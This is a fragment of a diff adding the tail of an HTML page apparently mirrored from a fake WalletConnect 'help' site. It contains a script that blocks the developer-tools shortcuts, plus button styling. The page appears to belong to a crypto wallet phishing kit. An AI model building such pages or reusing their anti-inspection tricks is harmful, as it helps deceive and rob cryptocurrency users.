+            else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
+                return false;
+            }
+        });
+    </script>
+
+    <style>
+        .btn-outline-primary {
+            width: 100%;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 15px;
+            line-height: 22px;
+            padding: 10px 20px;
+            -webkit-transition: all 0.3s ease-in-out;
+            -moz-transition: all 0.3s ease-in-out;
+            -ms-transition: all 0.3s ease-in-out;
+            -o-transition: all 0.3s ease-in-out;
+            transition: all 0.3s ease-in-out;
+            outline: none;
+            border: 1px solid #5142FC;
+            margin-bottom: 10px
+        }
+    </style>
+</body>
+
+
+<!-- Mirrored from helpdapps.web.app/walletconnect/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 25 Jun 2024 20:58:42 GMT -->
+</html>
